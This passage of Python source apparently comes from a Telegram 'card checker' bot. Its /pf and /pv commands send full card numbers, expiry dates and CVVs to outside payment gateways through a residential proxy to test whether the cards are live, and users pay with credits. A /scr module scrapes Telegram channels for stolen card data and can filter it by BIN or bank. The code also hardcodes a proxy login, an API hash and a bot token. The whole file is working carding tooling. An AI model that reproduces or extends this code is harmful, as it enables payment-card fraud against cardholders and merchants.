            """<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙈𝙞𝙨𝙨𝙞𝙣𝙜 𝘾𝙖𝙧𝙙 𝘿𝙚𝙩𝙖𝙞𝙡𝙨</b>

<a href='https://t.me/rev3rsex'>📝</a> <b>𝙐𝙨𝙖𝙜𝙚 𝙊𝙥𝙩𝙞𝙤𝙣𝙨:</b>

<i>1️⃣ Direct command:</i>
<code>/pf 4242424242424242|12|25|123</code>

<i>2️⃣ Reply to message:</i>
Reply to any message containing card details with <code>/pf</code>

<a href='https://t.me/rev3rsex'>💡</a> <b>𝙎𝙪𝙥𝙥𝙤𝙧𝙩𝙚𝙙 𝙁𝙤𝙧𝙢𝙖𝙩𝙨:</b>
<code>card:mm:yy:cvv</code>""",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Get user credits BEFORE processing the card
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/rev3rsex'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/rev3rsex'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/rev3rsex'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Create progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗣𝗮𝘆𝗙𝗮𝘀𝘁 0.30$</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML", disable_web_page_preview=True)
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check with PayFast API
            result = await check_card_with_payfast(card_details, user_info)
            
            # Format the response using format_response_payfast function
            formatted_response, _ = format_response_payfast(result, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.get("error") and not is_unlimited:
                # Deduct 1 credit in the background
                update_user_credits(user_id, -1)
                
                # Get updated credits for the response
                updated_credits = get_user_credits(user_id)
                
                # Add warning if credits are now 0
                if updated_credits is not None and updated_credits <= 0:
                    # Add warning message at the end of the result
                    formatted_response = formatted_response + f"\n\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            # disable_web_page_preview=True is added here to stop link previews
            await checking_message.edit_text(formatted_response, parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            logger.error("Error in background check")
            error_msg = f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙀𝙧𝙧𝙤𝙧 𝘿𝙪𝙧𝙞𝙣𝙜 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜</b>

<a href='https://t.me/rev3rsex'>📝</a> <b>𝘿𝙚𝙩𝙖𝙞𝙡𝙨:</b> <code>An unexpected error occurred</code>

<a href='https://t.me/rev3rsex'>💡</a> <b>𝙎𝙪𝙜𝙜𝙚𝙨𝙩𝙞𝙤𝙣:</b> <i>Please try again later.</i>"""
            await checking_message.edit_text(error_msg, parse_mode="HTML", disable_web_page_preview=True)
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())



# ============================================================
# MODULE: pv
# ============================================================
# Configure logging

# API endpoint for PayPal 5$ CVV
API_BASE_URL = CVV_API_URL

# Proxy Configuration
# Using the same proxy string as the previous example for consistency
PROXY_STRING = "http://user-FG9IqFSVPYNRnxxV-type-residential-session-c3ngj9de-country-US-city-Albuquerque-rotation-5:RCMd2xUcgo5Swkxo@geo.g-w.info:10080"

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

def pv_parse_card_details(card_string: str) -> Optional[tuple]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Pattern: 4169161410569379/12|16|931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379/12|16/931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379/12/16/931
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379|12/16|931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379|12/16/931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12|16|931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379:12|16/931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12/16|931
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def pv_extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        # Pattern: 4169161410569379/12|16|931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379/12|16/931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379/12/16/931
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379|12/16|931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379|12/16/931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12|16|931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379:12|16/931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12/16|931
        r'(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

async def check_card_pv(card_details: str, user_info: dict) -> Optional[str]:
    """
    Check card details using PayPal 5$ CVV API asynchronously with aiohttp.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Formatted response string or None if there was an error
    """
    # Parse card details
    parsed = pv_parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /pv card|mm|yy|cvv</i>"
    
    card_number, month, year, cvv = parsed
    
    # Get BIN information using imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Construct API URL
    # Format: https://cvv.cxchk.site/gate=cvv/cc=card|mm|yy|cvv
    card_string = f"{card_number}|{month}|{year}|{cvv}"
    
    api_url = f"{API_BASE_URL}/gateway=autostripe/key=Blackxcard/site=kabusvuya.com/cc={card_string}"
    
    max_retries = 3
    retry_delay = 2
    
    for attempt in range(max_retries):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=50)) as response:
                    # Check for 500 error specifically
                    if response.status == 500:
                        if attempt < max_retries - 1:  # Don't sleep on the last attempt
                            await asyncio.sleep(retry_delay * (attempt + 1))  # Exponential backoff
                            continue
                        else:
                            # All retries failed, return generic error
                            return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
                    
                    api_response = await response.json()
            
            # Format and return response
            return format_response_pv(api_response, user_info, card_details, brand, issuer, country_name, country_flag)
        
        except aiohttp.ClientConnectorError as e:
            # Connection errors (DNS, Refused, Disconnected)
            logger.error(f"Connection error checking card: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(retry_delay * (attempt + 1))
                continue
            else:
                return "⚠️ <b>Connection to API failed. Please try again later.</b>"
                
        except aiohttp.ClientError as e:
            logger.error(f"HTTP error checking card with PayPal 5$ CVV: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(retry_delay * (attempt + 1))
                continue
            else:
                # All retries failed, return generic error without leaking API details
                return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
        
        except json.JSONDecodeError as e:
            logger.error(f"JSON decode error checking card with PayPal 5$ CVV: {e}")
            return "⚠️ <b>An error occurred while processing the response.</b>\n\n<i>Please try again later.</i>"
        
        except Exception as e:
            logger.error(f"Unexpected error checking card with PayPal 5$ CVV: {e}")
            # Don't expose the actual error to the user
            return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
    
    # This should never be reached, but just in case
    return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"

def format_response_pv(api_response: dict, user_info: dict, card_details: str, 
                       brand: str, issuer: str, country_name: str, country_flag: str) -> str:
    """
    Format API response into a beautiful message with emojis for PayPal 5$ CVV.
    
    Args:
        api_response: Dictionary containing API response
        user_info: Dictionary containing user information
        card_details: Full card details string
        brand: Card brand from BIN lookup
        issuer: Bank name from BIN lookup
        country_name: Country name from BIN lookup
        country_flag: Country emoji from BIN lookup
        
    Returns:
        Formatted string with emojis
    """
    # Extract response fields
    # The new API returns "response" and "status"
    response_text = api_response.get("response", api_response.get("message", "UNKNOWN_ERROR"))
    status = api_response.get("status", "")
    
    # Determine status style based on status content
    status_lower = status.lower()
    if "approved" in status_lower:
        status_style = "<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅"
    elif "declined" in status_lower:
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
    else:
        # Default to Charged/Error styling if it's neither approved nor declined
        status_style = "<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> 🔥"
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Get user credits and format display
    user_credits = get_user_credits(user_id)
    if user_credits is None:
        credits_display = "Error"
    elif user_credits == float('inf'):
        credits_display = "Infinite😎"  # Display for unlimited credits
    else:
        credits_display = str(user_credits)

    # Create user link with profile name hyperlinked
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format response with exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts, updating Gateway and Response fields
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗣𝗮𝘆𝗽𝗮𝗹 5$ CVV</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{response_text}</code>
{bank_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response

# This function will be called from main.py
async def handle_pv_command(update, context):
    """
    Handle the /pv command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = pv_extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /pv card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /pv</i>", 
            parse_mode="HTML"
        )
        return
    
    # Get user credits BEFORE processing the card
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/rev3rsex'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/rev3rsex'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/rev3rsex'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML"
        )
        return
    
    # Create progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗣𝗮𝘆𝗽𝗮𝗹 5$ CVV</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check
            result = await check_card_pv(card_details, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.startswith("⚠️ <b>Missing card details!</b>") and not result.startswith("⚠️ <b>An error occurred"):
                # Only deduct credits if the user doesn't have unlimited
                if not is_unlimited:
                    # Deduct 1 credit in the background
                    update_user_credits(user_id, -1)
                    
                    # Get updated credits for the response
                    updated_credits = get_user_credits(user_id)
                    
                    # Add warning if credits are now 0
                    if updated_credits is not None and updated_credits <= 0:
                        # Add warning message at the end of the result
                        result = result + f"\n\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            # Don't expose the actual error to the user
            error_msg = "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
            await checking_message.edit_text(error_msg, parse_mode="HTML")
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())



# ============================================================
# MODULE: scr
# ============================================================
# API credentials
API_ID = 21902589
API_HASH = "646d988e7c7938f85ca652ece00b07ba"
BOT_TOKEN = "8705971644:AAH3DCTgpHi0C8nFWp5hDE9UDL3nLGNcJoE"
SESSION_STRING = ""  # Optional: set a valid Pyrogram session string to enable /scr

# Hardcoded limits and settings (as requested)
DEFAULT_LIMIT = 2000  # Card Scrapping Limit For Free/Trial Users
PREMIUM_LIMIT = 7000  # Card Scrapping Limit For Premium Users
COOLDOWN_FREE = 10  # Cooldown for Free/Trial users (in seconds)
COOLDOWN_TRIAL = 10  # Cooldown for Trial users (in seconds)
CREDIT_COST = 2  # Credits deducted for each successful command

# Set up logging

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

# Pattern to find credit card details
CARD_PATTERN = r'\d{13,19}\D*\d{1,2}\D*\d{2,4}\D*\d{3,4}'

# Import Pyrogram for scraping functionality
try:
    PYROGRAM_AVAILABLE = True
except ImportError:
    logger.warning("Pyrogram not available, scraping functionality will be limited")
    PYROGRAM_AVAILABLE = False

# Initialize Pyrogram client for scraping if available AND session string is set
if PYROGRAM_AVAILABLE and SESSION_STRING:
    user_client = PyrogramClient(
        "user_session",
        session_string=SESSION_STRING,
        workers=1000
    )
else:
    user_client = None
    if not SESSION_STRING:
        logger.warning("SESSION_STRING is empty, /scr scraping will be disabled")

# Function to extract and format card details from text
def extract_and_format_cards(text: str) -> List[str]:
    """
    Extract and format credit card details from text.
    
    Args:
        text: Text to search for card details
        
    Returns:
        List of formatted card strings
    """
    cards = []
    matches = re.findall(CARD_PATTERN, text)
    
    for match in matches:
        # Extract digits from the match
        digits = re.findall(r'\d+', match)
        if len(digits) >= 4:
            card_number = digits[0]
            month = digits[1].zfill(2)  # Ensure month is 2 digits
            year = digits[2]
            cvv = digits[3]
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
                
            cards.append(f"{card_number}|{month}|{year}|{cvv}")
    
    return cards

# Function to remove duplicates from a list
def remove_duplicates(cards: List[str]) -> tuple:
    """
    Remove duplicates from a list of cards.
    
    Args:
        cards: List of card strings
        
    Returns:
        Tuple of (unique_cards, duplicates_removed)
    """
    unique_cards = list(set(cards))
    duplicates_removed = len(cards) - len(unique_cards)
    return unique_cards, duplicates_removed

# Function to format the response message
def format_scr_response(results: Dict, user_info: Dict) -> str:
    """
    Format the scraping results into a beautiful message.
    
    Args:
        results: Dictionary containing scraping results
        user_info: Dictionary containing user information
        
    Returns:
        Formatted string with emojis
    """
    success = results.get("success", False)
    if not success:
        error_msg = results.get('error', 'Unknown error')
        formatted_error = f"⚠️ <b>Error scraping cards</b>: <code>{html.escape(error_msg)}</code>"
        return formatted_error
    
    cards_found = results.get("cards_found", 0)
    duplicates_removed = results.get("duplicates_removed", 0)
    source = results.get("source", "Unknown")
    bin_filter = results.get("bin_filter", "")
    bank_filter = results.get("bank_filter", "")
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Get user credits and format display
    user_credits = get_user_credits(user_id)
    if user_credits is None:
        credits_display = "Error"
    elif user_credits == float('inf'):
        credits_display = "Infinite😎"  # Display for unlimited credits
    else:
        credits_display = str(user_credits)
    
    # Create user link with profile name hyperlinked
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝑪𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅</b> ✅</pre>"""
    
    source_part = f"""<a href='https://t.me/rev3rsex'>⌬</a> <b>𝑺𝒐𝒖𝒓𝒄𝒆</b> ↬ <code>{source}</code>"""
    
    # Use bullet points for cards found and duplicates removed
    cards_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑪𝒂𝒓𝒅𝒔 𝑭𝒐𝒖𝒏𝒅</b> ↬ <code>{cards_found}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑫𝒖𝒑𝒍𝒊𝒄𝒂𝒕𝒆𝒔 𝑹𝒆𝒎𝒐𝒗𝒆𝒅</b> ↬ <code>{duplicates_removed}</code>"""
    
    filter_part = ""
    if bin_filter:
        filter_part += f"<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑩𝑰𝑵 𝑭𝒊𝒍𝒕𝒆𝒓</b> ↬ <code>{bin_filter}</code>"
    if bank_filter:
        filter_part += f"<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑩𝒂𝒏𝒌 𝑭𝒊𝒍𝒕𝒆𝒓</b> ↬ <code>{bank_filter}</code>"
    
    # Add credits info only if user has 0 credits and not unlimited
    credits_warning = ""
    if user_credits is not None and user_credits <= 0 and user_credits != float('inf'):
        credits_warning = f"\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
    
    # Combine all parts
    formatted_response = f"""{status_part}
{source_part}
{cards_part}
{filter_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>
{credits_warning}"""
    
    return formatted_response

# Function to safely send messages with retry logic (from main.py)
async def safe_send_message(context, chat_id, text, parse_mode=None, reply_markup=None, retries=3):
    for attempt in range(retries):
        try:
            return await context.bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode=parse_mode,
                reply_markup=reply_markup
            )
        except (TimedOut, NetworkError) as e:
            if attempt < retries - 1:
                await asyncio.sleep(1)  # Wait before retrying
                continue
            else:
                logging.error(f"Failed to send message after {retries} attempts: {e}")
                raise
        except Exception as e:
            logging.error(f"Unexpected error sending message: {e}")
            raise

# Function to safely edit messages with retry logic (from main.py)
async def safe_edit_message(context, chat_id, message_id, text=None, reply_markup=None, 
                          parse_mode=None, retries=3):
    for attempt in range(retries):
        try:
            if text:
                return await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=parse_mode,
                    reply_markup=reply_markup
                )
            else:
                return await context.bot.edit_message_reply_markup(
                    chat_id=chat_id,
                    message_id=message_id,
                    reply_markup=reply_markup
                )
        except (TimedOut, NetworkError) as e:
            if attempt < retries - 1:
                await asyncio.sleep(1)  # Wait before retrying
                continue
            else:
                logging.error(f"Failed to edit message after {retries} attempts: {e}")
                raise
        except Exception as e:
            logging.error(f"Unexpected error editing message: {e}")
            raise

# Function to join private chat using Pyrogram
async def join_private_chat(client, invite_link):
    try:
        await client.join_chat(invite_link)
        logger.info(f"Joined chat via invite link: {invite_link}")
        return True
    except UserAlreadyParticipant:
        logger.info(f"Already a participant in the chat: {invite_link}")
        return True
    except InviteRequestSent:
        logger.info(f"Join request sent to the chat: {invite_link}")
        return False
    except (InviteHashExpired, InviteHashInvalid) as e:
        logger.error(f"Failed to join chat {invite_link}: {e}")
        return False

# Function to initialize Pyrogram client
async def initialize_pyrogram():
    """Initialize the Pyrogram client for scraping"""
    if PYROGRAM_AVAILABLE:
        try:
            # Create the client if it doesn't exist
            if user_client is None:
                user_client = PyrogramClient(
                    "user_session",
                    session_string=SESSION_STRING,
                    workers=1000
                )
            
            # Start the client with timeout
            await user_client.start()
            logger.info("Pyrogram client started successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to start Pyrogram client: {e}")
            logger.error(f"Pyrogram initialization failed: {str(e)}")
            logger.error(f"Session string length: {len(SESSION_STRING)}")
            logger.error(f"Pyrogram version: {pyrogram.__version__ if 'pyrogram' in globals() else 'unknown'}")
            return False
    return False

# Function to scrape messages using Pyrogram
async def scrape_messages(client, channel_identifier, limit, start_number=None, bank_name=None):
    messages = []
    count = 0
    pattern = r'\d{13,19}\D*\d{1,2}\D*\d{2,4}\D*\d{3,4}'
    bin_pattern = re.compile(r'^\d{6}') if start_number else None

    logger.info(f"Starting to scrape messages from {channel_identifier} with limit {limit}")

    # Fetch messages in batches
    async for message in client.search_messages(channel_identifier):
        if count >= limit:
            break
        text = message.text or message.caption
        if text:
            # Check if the bank name is mentioned in the message (case-insensitive)
            if bank_name and bank_name.lower() not in text.lower():
                continue
            matched_messages = re.findall(pattern, text)
            if matched_messages:
                formatted_messages = []
                for matched_message in matched_messages:
                    extracted_values = re.findall(r'\d+', matched_message)
                    if len(extracted_values) == 4:
                        card_number, mo, year, cvv = extracted_values
                        year = year[-2:]
                        # Apply BIN filter if start_number is provided
                        if start_number:
                            if card_number.startswith(start_number[:6]):
                                formatted_messages.append(f"{card_number}|{mo}|{year}|{cvv}")
                        else:
                            formatted_messages.append(f"{card_number}|{mo}|{year}|{cvv}")
                messages.extend(formatted_messages)
                count += len(formatted_messages)
    logger.info(f"Scraped {len(messages)} messages from {channel_identifier}")
    return messages[:limit]

# Function to handle the /scr command
async def handle_scr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handle the /scr command with user-specific cooldown for Trial users.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    logger.info(f"User {username} (ID: {user_id}) initiated /scr command")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    logger.info(f"User tier: {user_tier}")
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        cooldown_seconds = COOLDOWN_TRIAL if user_tier == "Trial" else COOLDOWN_FREE
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=cooldown_seconds):
            remaining_seconds = cooldown_seconds - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
